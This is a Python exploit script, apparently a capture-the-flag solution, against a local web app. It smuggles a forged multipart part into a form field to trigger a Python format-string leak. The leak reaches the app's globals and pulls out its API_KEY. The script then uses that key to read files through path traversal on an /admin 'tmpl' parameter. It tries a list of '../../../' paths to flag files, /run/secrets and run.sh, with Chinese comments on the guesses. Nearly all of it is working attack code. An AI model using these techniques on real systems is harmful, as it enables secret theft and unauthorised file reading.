import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=5.0)
    return r.text, r.status_code

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 尝试读取 /proc/self/root 下的目录结构
# 如果是符号链接，可能能获取目录信息
paths = [
    # 尝试访问根目录下的文件
    '../../../flag-test.txt',
    '../../../flag.txt',
    # 尝试一些常见的 32 位 hex 模式
    '../../../flag-00000000000000000000000000000000.txt',
    '../../../flag-ffffffffffffffffffffffffffffffff.txt',
    # 尝试暴力猜测？这不现实...
    
    # 查看 /run 目录
    '../../../run/secrets/flag',
    '../../../run/flag',
    
    # Docker 常见位置
    '../../../var/run/secrets.d/flag',
    '../../../secrets/flag',
    
    # /opt
    '../../../opt/flag',
    '../../../opt/flag.txt',
    
    # 查看 run.sh 确认 flag 位置
    '../../../run.sh',
]

for p in paths:
    content, status = read_file_via_admin(api_key, p)
    print(f"\n[{p}] Status: {status}")
    if status == 200:
        print(content[:500])
